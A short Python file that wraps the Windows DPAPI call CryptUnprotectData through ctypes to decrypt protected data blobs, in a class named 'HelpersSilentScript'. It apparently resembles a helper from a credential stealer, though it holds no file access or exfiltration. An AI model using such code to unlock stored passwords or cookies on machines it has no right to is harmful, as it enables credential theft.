
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

class HelpersSilentScript:
    def CryptUnprotectData(self, encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()
        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 1, byref(blob_out)):
            return self.getData(blob_out)
        return None

    def getData(self, blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]     